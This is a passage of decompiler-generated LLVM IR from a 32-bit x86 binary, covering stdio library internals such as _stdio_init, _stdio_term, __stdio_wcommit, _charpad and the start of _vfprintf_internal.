  %v0_804e494 = load i32, i32* bitcast (i32** @global_var_8058238.153 to i32*), align 8
  store i32 %v0_804e494, i32* @eax, align 4
  %v1_804e499 = load i32, i32* @ebp, align 4
  %v2_804e499 = add i32 %v1_804e499, 32
  %v3_804e499 = inttoptr i32 %v2_804e499 to i32*
  store i32 %v0_804e494, i32* %v3_804e499, align 4
  %v2_804e49c = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804e49c, i32* @ecx, align 4
  %v0_804e49d = load i32, i32* @ebp, align 4
  store i32 %v0_804e49d, i32* bitcast (i32** @global_var_8058238.153 to i32*), align 8
  store i32 %v2_804e47e, i32* %stack_var_-76, align 4
  %v2_804e4a7 = call i32 @__pthread_return_void(i32 %v2_804e47e, i32 1)
  store i32 %v2_804e47e, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_804e45b, i32* %stack_var_-76, align 4
  %v2_804e4b1 = call i32 @__pthread_return_void(i32 %v2_804e45b, i32 1)
  br label %dec_label_pc_804e4b6

dec_label_pc_804e4b6:                             ; preds = %dec_label_pc_804e2cf, %dec_label_pc_804e450
  %storemerge = phi i32 [ %v2_804e4b1, %dec_label_pc_804e450 ], [ %v1_804e2d5, %dec_label_pc_804e2cf ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e4bd

dec_label_pc_804e4bb:                             ; preds = %dec_label_pc_804e2c5, %dec_label_pc_804e2b2
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804e4bd

dec_label_pc_804e4bd:                             ; preds = %dec_label_pc_804e428, %dec_label_pc_804e2fe, %dec_label_pc_804e4b6, %dec_label_pc_804e4bb
  %v0_804e4c0 = load i32, i32* @ebp, align 4
  store i32 %v0_804e4c0, i32* %eax.global-to-local, align 4
  %v2_804e4c2 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e4c2, i32* @ebx, align 4
  store i32 %v0_804e286, i32* @esi, align 4
  store i32 %v0_804e285, i32* @edi, align 4
  store i32 %v0_804e284, i32* @ebp, align 4
  ret i32 %v0_804e4c0

; uselistorder directives
  uselistorder i32 %v2_804e47e, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_804e45b, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804e415, { 1, 0 }
  uselistorder i32 %v1_804e3fe, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804e3e5, { 1, 0 }
  uselistorder i32 %v1_804e3ca, { 1, 0, 2 }
  uselistorder i32 %v11_804e37f, { 1, 0 }
  uselistorder i32 %v1_804e351, { 1, 0 }
  uselistorder i32 %v0_804e34d, { 1, 0 }
  uselistorder i32 %v2_804e383, { 1, 0, 2 }
  uselistorder i32 %v1_804e303, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 2, 3 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_804e4bd, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804e4b6, { 1, 0 }
  uselistorder label %dec_label_pc_804e428, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e373, { 1, 0 }
  uselistorder label %dec_label_pc_804e330, { 1, 0 }
  uselistorder label %dec_label_pc_804e2fa, { 1, 0 }
  uselistorder label %dec_label_pc_804e2e1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e2c5, { 1, 0 }
  uselistorder label %dec_label_pc_804e2b2, { 1, 2, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e4c9 = load i32, i32* @edi, align 4
  %v0_804e4ca = load i32, i32* @esi, align 4
  %v0_804e4cb = load i32, i32* @ebx, align 4
  store i32 %v0_804e4cb, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804e4d4 = call i32 @__errno_location(i32 %v0_804e4cb)
  %v0_804e4dc = load i16, i16* @global_var_8058280.144, align 128
  %v1_804e4dc = zext i16 %v0_804e4dc to i32
  store i32 %v1_804e4dc, i32* @esi, align 4
  %v1_804e4e3 = inttoptr i32 %v1_804e4d4 to i32*
  %v2_804e4e3 = load i32, i32* %v1_804e4e3, align 4
  store i32 %v2_804e4e3, i32* %ebp.global-to-local, align 4
  store i32 %v1_804e4d4, i32* @edi, align 4
  %v1_804e4e9 = call i32 @isatty(i32 0)
  %v0_804e4ee = load i32, i32* @ebx, align 4
  %v2_804e4f7 = sub i32 %v0_804e4ee, %v1_804e4e9
  %v2_804e4fb = mul i32 %v2_804e4f7, 256
  %v0_804e4fe = load i32, i32* @esi, align 4
  %v2_804e4fe = xor i32 %v0_804e4fe, %v2_804e4fb
  %v1_804e500 = trunc i32 %v2_804e4fe to i16
  store i16 %v1_804e500, i16* @global_var_8058280.144, align 128
  %v0_804e507 = load i16, i16* @global_var_80582d0.145, align 16
  %v1_804e507 = zext i16 %v0_804e507 to i32
  store i32 %v1_804e507, i32* @esi, align 4
  %v1_804e50e = call i32 @isatty(i32 1)
  %v0_804e513 = load i32, i32* @ebx, align 4
  %v2_804e513 = sub i32 %v0_804e513, %v1_804e50e
  %v2_804e515 = mul i32 %v2_804e513, 256
  %v0_804e518 = load i32, i32* @esi, align 4
  %v2_804e518 = xor i32 %v2_804e515, %v0_804e518
  %v1_804e51a = trunc i32 %v2_804e518 to i16
  store i16 %v1_804e51a, i16* @global_var_80582d0.145, align 16
  %v0_804e521 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e521 = load i32, i32* @edi, align 4
  %v2_804e521 = inttoptr i32 %v1_804e521 to i32*
  store i32 %v0_804e521, i32* %v2_804e521, align 4
  %v2_804e526 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e526, i32* @ebx, align 4
  store i32 %v0_804e4ca, i32* @esi, align 4
  store i32 %v0_804e4c9, i32* @edi, align 4
  ret i32 %v1_804e50e

; uselistorder directives
  uselistorder i32 %v1_804e4d4, { 1, 0 }
  uselistorder i16* @global_var_80582d0.145, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804e539 = inttoptr i32 %arg1 to i16*
  %v4_804e539 = call i32 @memcpy(i16* %v3_804e539, i32 ptrtoint (i32* @global_var_8056760.154 to i32), i32 24)
  ret i32 %v4_804e539
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e542 = load i32, i32* @esi, align 4
  %v0_804e543 = load i32, i32* @ebx, align 4
  store i32 %v0_804e543, i32* %stack_var_-8, align 4
  %v1_804e54c = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_805823c.152 to i32))
  store i32 %v1_804e54c, i32* %eax.global-to-local, align 4
  %v1_804e558 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8058254.148 to i32))
  store i32 %v1_804e558, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_8058238.153 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_804e5a222 = icmp eq i32 %storemerge21, 0
  %v1_804e5a424 = icmp eq i1 %v1_804e5a222, false
  br i1 %v1_804e5a424, label %dec_label_pc_804e565.lr.ph, label %dec_label_pc_804e5c2.preheader

dec_label_pc_804e565.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804e565

dec_label_pc_804e565:                             ; preds = %dec_label_pc_804e565.lr.ph, %dec_label_pc_804e58c
  %storemerge25 = phi i32 [ %storemerge21, %dec_label_pc_804e565.lr.ph ], [ %storemerge, %dec_label_pc_804e58c ]
  %v1_804e568 = add i32 %storemerge25, 56
  store i32 %v1_804e568, i32* @esi, align 4
  %v1_804e56c = call i32 @__pthread_return_0(i32 %v1_804e568)
  store i32 %v1_804e56c, i32* %eax.global-to-local, align 4
  %v1_804e574 = icmp eq i32 %v1_804e56c, 0
  br i1 %v1_804e574, label %dec_label_pc_804e58c, label %dec_label_pc_804e578

dec_label_pc_804e578:                             ; preds = %dec_label_pc_804e565
  %v0_804e578 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e578 = add i32 %v0_804e578, 8
  %v2_804e578 = inttoptr i32 %v1_804e578 to i32*
  %v3_804e578 = load i32, i32* %v2_804e578, align 4
  store i32 %v3_804e578, i32* %eax.global-to-local, align 4
  %v1_804e57b = inttoptr i32 %v0_804e578 to i16*
  store i16 48, i16* %v1_804e57b, align 2
  %v0_804e580 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e580 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e580 = add i32 %v1_804e580, 24
  %v3_804e580 = inttoptr i32 %v2_804e580 to i32*
  store i32 %v0_804e580, i32* %v3_804e580, align 4
  %v0_804e583 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e583 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e583 = add i32 %v1_804e583, 28
  %v3_804e583 = inttoptr i32 %v2_804e583 to i32*
  store i32 %v0_804e583, i32* %v3_804e583, align 4
  %v0_804e586 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e586 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e586 = add i32 %v1_804e586, 16
  %v3_804e586 = inttoptr i32 %v2_804e586 to i32*
  store i32 %v0_804e586, i32* %v3_804e586, align 4
  %v0_804e589 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e589 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e589 = add i32 %v1_804e589, 20
  %v3_804e589 = inttoptr i32 %v2_804e589 to i32*
  store i32 %v0_804e589, i32* %v3_804e589, align 4
  br label %dec_label_pc_804e58c

dec_label_pc_804e58c:                             ; preds = %dec_label_pc_804e565, %dec_label_pc_804e578
  %v0_804e58f = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e58f = add i32 %v0_804e58f, 52
  %v2_804e58f = inttoptr i32 %v1_804e58f to i32*
  store i32 1, i32* %v2_804e58f, align 4
  %v0_804e596 = load i32, i32* @esi, align 4
  %v1_804e597 = call i32 @__stdio_init_mutex(i32 %v0_804e596)
  store i32 %v1_804e597, i32* %eax.global-to-local, align 4
  %v0_804e59c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e59c = add i32 %v0_804e59c, 32
  %v2_804e59c = inttoptr i32 %v1_804e59c to i32*
  %storemerge = load i32, i32* %v2_804e59c, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804e5a2 = icmp eq i32 %storemerge, 0
  %v1_804e5a4 = icmp eq i1 %v1_804e5a2, false
  br i1 %v1_804e5a4, label %dec_label_pc_804e565, label %dec_label_pc_804e59f.dec_label_pc_804e5c2.preheader_crit_edge

dec_label_pc_804e59f.dec_label_pc_804e5c2.preheader_crit_edge: ; preds = %dec_label_pc_804e58c
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_8058238.153 to i32*), align 4
  br label %dec_label_pc_804e5c2.preheader

dec_label_pc_804e5c2.preheader:                   ; preds = %dec_label_pc_804e59f.dec_label_pc_804e5c2.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804e59f.dec_label_pc_804e5c2.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804e5c23 = icmp eq i32 %storemerge12, 0
  %v1_804e5c410 = icmp eq i1 %v1_804e5c23, false
  br i1 %v1_804e5c410, label %dec_label_pc_804e5ae.preheader, label %dec_label_pc_804e5c6

dec_label_pc_804e5ae.preheader:                   ; preds = %dec_label_pc_804e5c2.preheader
  br label %dec_label_pc_804e5ae

dec_label_pc_804e5ae:                             ; preds = %dec_label_pc_804e5ae.preheader, %dec_label_pc_804e5bf
  %v0_804e5b6 = phi i32 [ %storemerge1, %dec_label_pc_804e5bf ], [ %storemerge12, %dec_label_pc_804e5ae.preheader ]
  %v1_804e5ae = inttoptr i32 %v0_804e5b6 to i8*
  %v2_804e5ae = load i8, i8* %v1_804e5ae, align 1
  %v3_804e5ae = and i8 %v2_804e5ae, 64
  %v4_804e5ae = icmp eq i8 %v3_804e5ae, 0
  br i1 %v4_804e5ae, label %dec_label_pc_804e5bf, label %dec_label_pc_804e5b3

dec_label_pc_804e5b3:                             ; preds = %dec_label_pc_804e5ae
  %v1_804e5b7 = call i32 @__stdio_wcommit(i32 %v0_804e5b6)
  store i32 %v1_804e5b7, i32* %eax.global-to-local, align 4
  %v0_804e5bf.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e5bf

dec_label_pc_804e5bf:                             ; preds = %dec_label_pc_804e5ae, %dec_label_pc_804e5b3
  %v0_804e5bf = phi i32 [ %v0_804e5b6, %dec_label_pc_804e5ae ], [ %v0_804e5bf.pre, %dec_label_pc_804e5b3 ]
  %v1_804e5bf = add i32 %v0_804e5bf, 32
  %v2_804e5bf = inttoptr i32 %v1_804e5bf to i32*
  %storemerge1 = load i32, i32* %v2_804e5bf, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804e5c2 = icmp eq i32 %storemerge1, 0
  %v1_804e5c4 = icmp eq i1 %v1_804e5c2, false
  br i1 %v1_804e5c4, label %dec_label_pc_804e5ae, label %dec_label_pc_804e5c6

dec_label_pc_804e5c6:                             ; preds = %dec_label_pc_804e5bf, %dec_label_pc_804e5c2.preheader
  %v2_804e5c6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e5c6, i32* %eax.global-to-local, align 4
  %v2_804e5c7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e5c7, i32* @ebx, align 4
  store i32 %v0_804e542, i32* @esi, align 4
  ret i32 %v2_804e5c6

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_804e5bf, { 1, 0 }
  uselistorder label %dec_label_pc_804e5ae, { 1, 0 }
  uselistorder label %dec_label_pc_804e58c, { 1, 0 }
  uselistorder label %dec_label_pc_804e565, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804e5cc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e5d4 = add i32 %arg1, 8
  %v2_804e5d4 = inttoptr i32 %v1_804e5d4 to i32*
  %v3_804e5d4 = load i32, i32* %v2_804e5d4, align 4
  store i32 %v3_804e5d4, i32* %edx.global-to-local, align 4
  %v1_804e5d7 = add i32 %arg1, 16
  %v2_804e5d7 = inttoptr i32 %v1_804e5d7 to i32*
  %v3_804e5d7 = load i32, i32* %v2_804e5d7, align 4
  %v2_804e5da = sub i32 %v3_804e5d7, %v3_804e5d4
  %v12_804e5da = icmp eq i32 %v2_804e5da, 0
  store i32 %v2_804e5da, i32* %eax.global-to-local, align 4
  br i1 %v12_804e5da, label %dec_label_pc_804e5ed, label %dec_label_pc_804e5de

dec_label_pc_804e5de:                             ; preds = %entry
  store i32 %v3_804e5d4, i32* %v2_804e5d7, align 4
  %v0_804e5e1 = load i32, i32* @ecx, align 4
  %v0_804e5e2 = load i32, i32* %eax.global-to-local, align 4
  %v0_804e5e3 = load i32, i32* %edx.global-to-local, align 4
  %v0_804e5e4 = load i32, i32* @ebx, align 4
  %v4_804e5e5 = inttoptr i32 %v0_804e5e4 to i16*
  %v5_804e5e5 = call i32 @__stdio_WRITE(i16* %v4_804e5e5, i32 %v0_804e5e3, i32 %v0_804e5e2, i32 %v0_804e5e1)
  store i32 %v5_804e5e5, i32* %eax.global-to-local, align 4
  %v0_804e5ed.pre = load i32, i32* @ebx, align 4
  %v2_804e5f3.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804e5ed

dec_label_pc_804e5ed:                             ; preds = %entry, %dec_label_pc_804e5de
  %v2_804e5f3 = phi i32 [ %tmp11, %entry ], [ %v2_804e5f3.pre, %dec_label_pc_804e5de ]
  %v0_804e5ed = phi i32 [ %arg1, %entry ], [ %v0_804e5ed.pre, %dec_label_pc_804e5de ]
  %v1_804e5ed = add i32 %v0_804e5ed, 16
  %v2_804e5ed = inttoptr i32 %v1_804e5ed to i32*
  %v3_804e5ed = load i32, i32* %v2_804e5ed, align 4
  store i32 %v3_804e5ed, i32* %eax.global-to-local, align 4
  %v2_804e5f0 = add i32 %v0_804e5ed, 8
  %v3_804e5f0 = inttoptr i32 %v2_804e5f0 to i32*
  %v4_804e5f0 = load i32, i32* %v3_804e5f0, align 4
  %v5_804e5f0 = sub i32 %v3_804e5ed, %v4_804e5f0
  store i32 %v5_804e5f0, i32* %eax.global-to-local, align 4
  store i32 %v2_804e5f3, i32* @edx, align 4
  store i32 %v0_804e5cc, i32* @ebx, align 4
  ret i32 %v5_804e5f0

; uselistorder directives
  uselistorder i32 %v0_804e5ed, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804e5ed, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_804e5f8 = load i32, i32* @edi, align 4
  %v0_804e5f9 = load i32, i32* @eax, align 4
  store i32 %v0_804e5f9, i32* @edi, align 4
  %v0_804e5fb = load i32, i32* @esi, align 4
  %v0_804e5fc = load i32, i32* @ecx, align 4
  store i32 %v0_804e5fc, i32* @esi, align 4
  %v0_804e5fe = load i32, i32* @ebx, align 4
  store i32 %v0_804e5fc, i32* @ebx, align 4
  %v0_804e604 = load i32, i32* @edx, align 4
  store i32 %v0_804e604, i32* %stack_var_-13, align 4
  %v1_804e60b2 = icmp eq i32 %v0_804e5fc, 0
  br i1 %v1_804e60b2, label %dec_label_pc_804e623, label %dec_label_pc_804e60f.lr.ph

dec_label_pc_804e60f.lr.ph:                       ; preds = %entry
  %v2_804e60f = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_804e60f

dec_label_pc_804e60a:                             ; preds = %dec_label_pc_804e60f
  %v1_804e60a = add i32 %v0_804e60a, -1
  %v8_804e60a = icmp eq i32 %v1_804e60a, 0
  store i32 %v1_804e60a, i32* @ebx, align 4
  br i1 %v8_804e60a, label %dec_label_pc_804e623.loopexit, label %dec_label_pc_804e60a.dec_label_pc_804e60f_crit_edge

dec_label_pc_804e60a.dec_label_pc_804e60f_crit_edge: ; preds = %dec_label_pc_804e60a
  %v0_804e613.pre = load i32, i32* @edx, align 4
  %v0_804e614.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e60f

dec_label_pc_804e60f:                             ; preds = %dec_label_pc_804e60a.dec_label_pc_804e60f_crit_edge, %dec_label_pc_804e60f.lr.ph
  %v0_804e614 = phi i32 [ %v0_804e614.pre, %dec_label_pc_804e60a.dec_label_pc_804e60f_crit_edge ], [ %v0_804e5f9, %dec_label_pc_804e60f.lr.ph ]
  %v0_804e613 = phi i32 [ %v0_804e613.pre, %dec_label_pc_804e60a.dec_label_pc_804e60f_crit_edge ], [ %v0_804e604, %dec_label_pc_804e60f.lr.ph ]
  %v4_804e618 = call i32 @__stdio_fwrite(i32 %v2_804e60f, i32 1, i32 %v0_804e614, i32 %v0_804e613)
  %v8_804e620 = icmp eq i32 %v4_804e618, 1
  %v0_804e60a = load i32, i32* @ebx, align 4
  br i1 %v8_804e620, label %dec_label_pc_804e60a, label %dec_label_pc_804e623.loopexit

dec_label_pc_804e623.loopexit:                    ; preds = %dec_label_pc_804e60a, %dec_label_pc_804e60f
  %v1_804e626.ph = phi i32 [ %v0_804e60a, %dec_label_pc_804e60f ], [ 0, %dec_label_pc_804e60a ]
  %v0_804e626.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e623

dec_label_pc_804e623:                             ; preds = %dec_label_pc_804e623.loopexit, %entry
  %v0_804e626 = phi i32 [ 0, %entry ], [ %v0_804e626.pre, %dec_label_pc_804e623.loopexit ]
  %v1_804e626 = phi i32 [ 0, %entry ], [ %v1_804e626.ph, %dec_label_pc_804e623.loopexit ]
  %v2_804e626 = sub i32 %v0_804e626, %v1_804e626
  store i32 %v0_804e5fe, i32* @ebx, align 4
  store i32 %v0_804e5fb, i32* @esi, align 4
  store i32 %v0_804e5f8, i32* @edi, align 4
  ret i32 %v2_804e626

; uselistorder directives
  uselistorder i32 %v1_804e60a, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_804e623.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804e641 = trunc i32 %arg2 to i8
  %v5_804e641 = icmp slt i8 %v3_804e641, 0
  %v1_804e643 = icmp eq i1 %v5_804e641, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_804e643, label %dec_label_pc_804e674, label %dec_label_pc_804e645

dec_label_pc_804e645:                             ; preds = %entry
  %v3_804e64c = call i32 @strlen(i8* %arg4)
  %v0_804e654 = load i32, i32* @ebx, align 4
  %v2_804e654 = sub i32 %v0_804e654, %v3_804e64c
  store i32 %v2_804e654, i32* @ebx, align 4
  store i32 %v3_804e64c, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_804e654, 1
  br i1 %tmp23, label %dec_label_pc_804e672, label %dec_label_pc_804e65c

dec_label_pc_804e65c:                             ; preds = %dec_label_pc_804e645
  store i32 %arg1, i32* @eax, align 4
  %v0_804e660 = load i32, i32* @edi, align 4
  %v1_804e660 = urem i32 %v0_804e660, 128
  store i32 %v1_804e660, i32* @edi, align 4
  store i32 %v2_804e654, i32* @ecx, align 4
  store i32 %v1_804e660, i32* @edx, align 4
  %v0_804e667 = call i32 @_charpad()
  %v12_804e66c = icmp eq i32 %v0_804e667, %v2_804e654
  store i32 %v0_804e667, i32* @ebp, align 4
  %v1_804e670 = icmp eq i1 %v12_804e66c, false
  br i1 %v1_804e670, label %dec_label_pc_804e68e, label %dec_label_pc_804e65c.dec_label_pc_804e672_crit_edge

dec_label_pc_804e65c.dec_label_pc_804e672_crit_edge: ; preds = %dec_label_pc_804e65c
  %v0_804e672.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e672

dec_label_pc_804e672:                             ; preds = %dec_label_pc_804e65c.dec_label_pc_804e672_crit_edge, %dec_label_pc_804e645
  %v0_804e672 = phi i32 [ %v0_804e672.pre, %dec_label_pc_804e65c.dec_label_pc_804e672_crit_edge ], [ %v3_804e64c, %dec_label_pc_804e645 ]
  store i32 %v0_804e672, i32* @ebx, align 4
  br label %dec_label_pc_804e674

dec_label_pc_804e674:                             ; preds = %entry, %dec_label_pc_804e672
  %v0_804e67f = phi i32 [ %arg3, %entry ], [ %v0_804e672, %dec_label_pc_804e672 ]
  %tmp24 = icmp slt i32 %v0_804e67f, 1
  br i1 %tmp24, label %dec_label_pc_804e68c, label %dec_label_pc_804e67a

dec_label_pc_804e67a:                             ; preds = %dec_label_pc_804e674
  %v0_804e67a = load i32, i32* @ecx, align 4
  %v5_804e684 = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_804e67f, i32 %arg1, i32 %v0_804e67a)
  br label %dec_label_pc_804e68c

dec_label_pc_804e68c:                             ; preds = %dec_label_pc_804e674, %dec_label_pc_804e67a
  %v1_804e68c = phi i32 [ 0, %dec_label_pc_804e674 ], [ %v5_804e684, %dec_label_pc_804e67a ]
  %v0_804e68c = load i32, i32* @ebp, align 4
  %v2_804e68c = add i32 %v0_804e68c, %v1_804e68c
  br label %dec_label_pc_804e68e

dec_label_pc_804e68e:                             ; preds = %dec_label_pc_804e65c, %dec_label_pc_804e68c
  %v0_804e691 = phi i32 [ %v0_804e667, %dec_label_pc_804e65c ], [ %v2_804e68c, %dec_label_pc_804e68c ]
  ret i32 %v0_804e691

; uselistorder directives
  uselistorder i32 %v0_804e67f, { 1, 0 }
  uselistorder i32 %v0_804e667, { 1, 2, 0 }
  uselistorder i32 %v1_804e660, { 1, 0 }
  uselistorder i32 %v2_804e654, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804e68e, { 1, 0 }
  uselistorder label %dec_label_pc_804e68c, { 1, 0 }
  uselistorder label %dec_label_pc_804e674, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e69b = load i32, i32* @ebx, align 4
  store i32 %v0_804e69b, i32* %stack_var_-16, align 4
  %v4_804e69b = ptrtoint i32* %stack_var_-16 to i32
  %v1_804e69c = add i32 %v4_804e69b, -356
  %v10_804e69c = icmp slt i32 %v1_804e69c, 0
  store i1 %v10_804e69c, i1* %sf.global-to-local, align 1
  %v4_804e6a2 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804e6a2, i32* @ebx, align 4
  %v2_804e6aa = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_804e6aa, i32* @esi, align 4
  %v5_804e6af = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_804e6a2)
  store i32 %v5_804e6af, i32* %eax.global-to-local, align 4
  %v2_804e6b7 = icmp slt i32 %v5_804e6af, 0
  store i1 %v2_804e6b7, i1* %sf.global-to-local, align 1
  %v1_804e6b9 = icmp eq i1 %v2_804e6b7, false
  br i1 %v1_804e6b9, label %dec_label_pc_804e6f9, label %dec_label_pc_804e6bb

dec_label_pc_804e6bb:                             ; preds = %entry
  %v12_804e6b4 = ptrtoint i32* %stack_var_-364 to i32
  %v3_804e6bb = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_804e6bb, i32* @ebx, align 4
  %v1_804e6bf = add i32 %v12_804e6b4, -12
  %v10_804e6bf = icmp slt i32 %v1_804e6bf, 0
  store i1 %v10_804e6bf, i1* %sf.global-to-local, align 1
  %v5_804e6c2 = inttoptr i32 %v3_804e6bb to i8*
  %v3_804e6c3 = call i32 @strlen(i8* %v5_804e6c2)
  store i32 %v3_804e6c3, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v1_804e6d2 = icmp eq i32 %v3_804e6c3, 0
  %v2_804e6d2 = icmp slt i32 %v3_804e6c3, 0
  store i1 %v2_804e6d2, i1* %sf.global-to-local, align 1
  br i1 %v1_804e6d2, label %dec_label_pc_804ec42, label %dec_label_pc_804e6da

dec_label_pc_804e6da:                             ; preds = %dec_label_pc_804e6bb
  %v0_804e6da = load i32, i32* @edx, align 4
  %v0_804e6e3 = load i32, i32* @ebx, align 4
  %v6_804e6e4 = call i32 @__stdio_fwrite(i32 %v0_804e6e3, i32 %v3_804e6c3, i32 %arg1, i32 %v0_804e6da)
  store i32 %v6_804e6e4, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v0_804e6f1 = load i32, i32* @esp, align 4
  %v1_804e6f1 = add i32 %v0_804e6f1, 16
  %v7_804e6f1 = icmp slt i32 %v1_804e6f1, 0
  store i1 %v7_804e6f1, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804ec42

dec_label_pc_804e6f9:                             ; preds = %entry
  %v6_804e703 = call i32 @_ppfs_prepargs(i32 %v2_804e6aa, i32 %arg3, i32 %v5_804e6af, i32 %v5_804e6af)
  store i32 %v6_804e703, i32* %eax.global-to-local, align 4
  %v0_804e708 = load i32, i32* @ebx, align 4
  store i32 %v0_804e708, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_804e712 = load i32, i32* @esp, align 4
  %v1_804e712 = add i32 %v0_804e712, 16
  %v7_804e712 = icmp slt i32 %v1_804e712, 0
  store i1 %v7_804e712, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804e718

dec_label_pc_804e717:                             ; preds = %dec_label_pc_804e71e
  %v1_804e717 = add i32 %v0_804e726, 1
  %v9_804e717 = icmp slt i32 %v1_804e717, 0
  store i1 %v9_804e717, i1* %sf.global-to-local, align 1
  store i32 %v1_804e717, i32* @ebx, align 4
  br label %dec_label_pc_804e718.backedge

dec_label_pc_804e718.backedge:                    ; preds = %dec_label_pc_804e717, %dec_label_pc_804ec28, %dec_label_pc_804ec33
